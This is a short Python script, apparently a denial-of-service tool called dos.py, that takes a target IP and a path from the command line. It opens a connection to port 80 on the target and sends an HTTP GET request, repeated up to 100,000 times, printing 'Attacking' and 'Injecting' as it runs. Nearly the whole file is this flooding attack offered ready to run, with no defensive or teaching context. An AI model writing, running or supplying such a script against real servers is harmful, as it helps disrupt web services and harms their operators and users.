import socket, sys

def socketGaierror():
	print("\n[!] You entered the wrong format of the IP address.")

def typeErr():
	print("\n[!] You have to use 'python', not 'python3'.")

def usage():
	return """
		Usage: python dos.py <ip_addr> apache 
	"""

print("[*] Attacking: " + sys.argv[1])
print("[*] Injecting: " + sys.argv[2])

def attack():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], 80))
    print(">> GET /" + sys.argv[2] + " HTTP/1.1")
    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n")
    s.close()
try:
	for i in range(1, 100000):
		attack()
except KeyboardInterrupt:
	print("\n[*] Exitted.")
except socket.gaierror:
	socketGaierror()
	print(usage())
except TypeError:
	typeErr()
	print(usage())
